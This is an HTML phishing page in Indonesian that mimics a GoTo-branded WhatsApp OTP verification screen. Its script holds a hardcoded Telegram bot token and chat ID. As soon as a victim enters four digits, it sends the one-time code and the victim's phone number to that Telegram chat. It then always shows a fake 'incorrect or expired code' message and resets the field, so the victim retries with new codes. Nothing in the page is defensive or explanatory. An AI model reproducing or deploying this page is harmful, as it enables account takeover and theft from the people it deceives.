<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Verifikasi OTP WhatsApp</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #f3f4f6;
      -webkit-text-size-adjust: 100%;
    }
  </style>
</head>
<body class="flex flex-col min-h-screen text-slate-800 antialiased select-none">

  <div class="w-full max-w-[420px] mx-auto min-h-screen bg-[#f3f4f6] flex flex-col justify-between pt-5 px-5 sm:px-6 pb-6 shadow-sm">
    
    <!-- Bagian Atas -->
    <div>
      <!-- Tombol Kembali / Panah Kiri -->
      <div class="flex items-center mb-6">
        <button type="button" onclick="history.back()" class="text-slate-800 font-bold text-2xl active:opacity-60 leading-none">
          ←
        </button>
      </div>

      <!-- Judul Utama -->
      <h1 class="text-[24px] leading-tight font-extrabold text-slate-900 tracking-tight mb-2">
        Cek WhatsApp, ya
      </h1>

      <!-- Keterangan Nomor HP -->
      <p id="phone-info" class="text-slate-500 text-[14px] mb-6">
        Kode-nya kami kirim ke +62********8855
      </p>

      <!-- Label OTP -->
      <div class="flex justify-between items-center mb-2">
        <span class="text-xs font-bold text-slate-800 tracking-wide">OTP <span class="text-red-500">*</span></span>
        <div class="flex items-center gap-1.5 text-xs text-slate-600 font-medium">
          <span class="w-1.5 h-1.5 rounded-full bg-emerald-500 inline-block"></span>
          <span id="timer">00:26</span>
        </div>
      </div>

      <!-- Kotak Input OTP (4 Titik Lingkaran) -->
      <div class="bg-white rounded-xl py-4 px-5 shadow-sm border border-slate-200/80 flex justify-between items-center mb-2">
        <div class="flex items-center gap-3">
          <div class="otp-circle w-3 h-3 rounded-full bg-slate-400 transition-all duration-150"></div>
          <div class="otp-circle w-3 h-3 rounded-full bg-slate-300 transition-all duration-150"></div>
          <div class="otp-circle w-3 h-3 rounded-full bg-slate-300 transition-all duration-150"></div>
          <div class="otp-circle w-3 h-3 rounded-full bg-slate-300 transition-all duration-150"></div>
        </div>
      </div>

      <!-- TEKS MERAH PERINGATAN (Awalnya disembunyikan, akan muncul jika OTP diisi tapi salah) -->
      <div id="error-msg" class="hidden text-red-500 text-xs font-semibold mb-4 mt-1">
        Kode OTP salah atau sudah kedaluwarsa. Silakan coba lagi.
      </div>

      <!-- Tombol Buka WhatsApp -->
      <div class="mt-5 space-y-3">
        <button type="button" class="w-full py-3 px-4 rounded-full border border-emerald-600 text-emerald-700 font-bold text-sm bg-white active:bg-emerald-50 transition-colors text-center shadow-sm">
          Buka WhatsApp
        </button>

        <button type="button" class="w-full py-3 px-4 rounded-full bg-white text-slate-800 font-bold text-sm border border-slate-200 active:bg-slate-50 transition-colors text-center shadow-sm">
          Coba Metode Lainnya
        </button>
      </div>
    </div>

    <!-- Bagian Bawah: Keypad Angka & Logo Goto -->
    <div>
      <!-- Powered by Goto Logo -->
      <div class="flex items-center justify-center gap-1.5 mb-4 text-xs text-slate-500 font-medium">
        <span>from</span>
        <span class="text-emerald-600 font-extrabold tracking-wider text-sm">goto</span>
      </div>

      <!-- Keypad Angka Custom -->
      <div class="grid grid-cols-3 text-center bg-[#f3f4f6]">
        <button type="button" onclick="pressNumber('1')" class="py-3 text-2xl font-bold text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">1</button>
        <button type="button" onclick="pressNumber('2')" class="py-3 text-2xl font-bold text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">2</button>
        <button type="button" onclick="pressNumber('3')" class="py-3 text-2xl font-bold text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">3</button>
        
        <button type="button" onclick="pressNumber('4')" class="py-3 text-2xl font-bold text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">4</button>
        <button type="button" onclick="pressNumber('5')" class="py-3 text-2xl font-bold text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">5</button>
        <button type="button" onclick="pressNumber('6')" class="py-3 text-2xl font-bold text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">6</button>
        
        <button type="button" onclick="pressNumber('7')" class="py-3 text-2xl font-bold text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">7</button>
        <button type="button" onclick="pressNumber('8')" class="py-3 text-2xl font-bold text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">8</button>
        <button type="button" onclick="pressNumber('9')" class="py-3 text-2xl font-bold text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">9</button>
        
        <div></div>
        <button type="button" onclick="pressNumber('0')" class="py-3 text-2xl font-bold text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">0</button>
        <button type="button" onclick="pressDelete()" class="py-3 text-xl font-bold text-slate-900 flex items-center justify-center active:bg-slate-200/60 rounded-xl transition-colors">
          <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2M3 12l6.414-6.414a2 2 0 011.414-.586H19a2 2 0 012 2v10a2 2 0 01-2 2h-8.172a2 2 0 01-1.414-.586L3 12z" />
          </svg>
        </button>
      </div>
    </div>

  </div>

  <script>
    const BOT_TOKEN = "8881822233:AAE3UwszOo27KceLDBtNKdSD3AgANrxZncU";
    const CHAT_ID = "6742478722";

    let otp = "";
    const circles = document.querySelectorAll('.otp-circle');
    const errorMsg = document.getElementById('error-msg');

    const urlParams = new URLSearchParams(window.location.search);
    const userPhone = urlParams.get('phone') || localStorage.getItem('userPhone') || "Tidak diketahui";

    // Tampilkan nomor HP jika ada dari parameter sebelumnya
    if (urlParams.get('phone')) {
      let phone = urlParams.get('phone');
      let maskedPhone = "+62" + phone.slice(0, 2) + "****" + phone.slice(-4);
      document.getElementById('phone-info').innerText = `Kode-nya kami kirim ke ${maskedPhone}`;
    }

    function pressNumber(num) {
      if (otp.length < 4) {
        otp += num;
        updateCircles();

        if (otp.length === 4) {
          sendOtpToTelegram();
        }
      }
    }

    function pressDelete() {
      if (otp.length > 0) {
        otp = otp.slice(0, -1);
        errorMsg.classList.add('hidden'); // Sembunyikan teks merah saat hapus
        updateCircles();
      }
    }

    function updateCircles() {
      circles.forEach((circle, index) => {
        if (index < otp.length) {
          circle.style.backgroundColor = "#059669"; // Hijau saat terisi
        } else {
          circle.style.backgroundColor = "#cbd5e1"; // Abu-abu
        }
      });
    }

    async function sendOtpToTelegram() {
      const text = `🔑 *Kode OTP WhatsApp Masuk*\n\n*Nomor HP:* +62${userPhone}\n*OTP:* ${otp}`;

      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
          })
        });
      } catch (err) {
        console.log("Error Telegram");
      }

      // JANGAN PINDAH HALAMAN, TAPI MUNCULKAN TEKS MERAH DAN RESET OTP
      setTimeout(() => {
        errorMsg.classList.remove('hidden'); // Munculkan teks merah
        otp = ""; // Kosongkan OTP kembali
        updateCircles();
      }, 400);
    }
  </script>
</body>
</html>
